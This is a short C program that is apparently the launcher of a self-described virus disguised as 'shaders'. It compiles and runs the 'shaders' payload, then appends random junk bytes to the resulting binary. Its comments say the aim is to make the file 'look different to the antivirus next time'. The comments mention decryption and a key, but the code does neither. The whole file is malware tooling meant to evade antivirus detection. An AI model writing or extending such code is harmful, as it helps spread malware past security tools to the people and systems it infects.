#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <sys/wait.h>

void morphFile() {
    FILE *fp;
    int randNum;

    // Open the file Virus to morph
    fp = fopen("shaders", "a");

    if (fp == NULL) {
        exit(0); // Exit with no error to target
    }

    // Append multiple bytes of junk binary to the end of the file
    srand(time(NULL));

    // Decide how many bytes to append (let's say 5 bytes for this example)
    int numBytes = 5;
    unsigned char junkBytes[numBytes];

    // Fill junkBytes array with random values
    for (int i = 0; i < numBytes; i++) {
        randNum = rand() % 10; // Random number between 0 and 9
        switch(randNum) {
            case 0:
                junkBytes[i] = 0;  // Null byte
                break;
            case 1:
                junkBytes[i] = 0x10;  // ASCII 16 (non-printable)
                break;
            case 2:
                junkBytes[i] = 0x07;  // ASCII 7 (bell)
                break;
            case 3:
                junkBytes[i] = 0x14;  // ASCII 20
                break;
            case 4:
                junkBytes[i] = 0x18;  // ASCII 24
                break;
            case 5:
                junkBytes[i] = 0;  // Null byte
                break;
            case 6:
                junkBytes[i] = 0x1F;  // ASCII 31 (unit separator)
                break;
            case 7:
                junkBytes[i] = 0x1E;  // ASCII 30 (file separator)
                break;
            case 8:
                junkBytes[i] = 0x02;  // ASCII 2 (start of text)
                break;
            case 9:
                junkBytes[i] = 0x12;  // ASCII 18 (DC2)
                break;
        }
    }

    // Write all the junk bytes to the file at once
    fwrite(junkBytes, sizeof(unsigned char), numBytes, fp);

    // Close the file
    fclose(fp);
}


int main(int argc, char*argv[]) {

	int status;
	// Compile the source files Virus into object files
    	printf("Compiling shaders.c into shaders.o...\n");
    	if (system("gcc -c shaders.c -o shaders.o") != 0) {
        printf("Error compiling Virus.c\n");
        return 1;
    	}
		
	printf("Making Exe File of Shaders...\n");
    	if (system("gcc shaders.o -o shaders") != 0) {
        printf("Error making exe file\n");
        return 1;
    	}
	//Once the file is decrypted, start Virus running
	system("./shaders");
	
	// Wait for virus to finish
	wait(&status);
	
	//Encrypt/Morph the file virus using the key so it looks different to the antivirus next time
	morphFile();
	printf("Morphing Done");

	return 0;
}


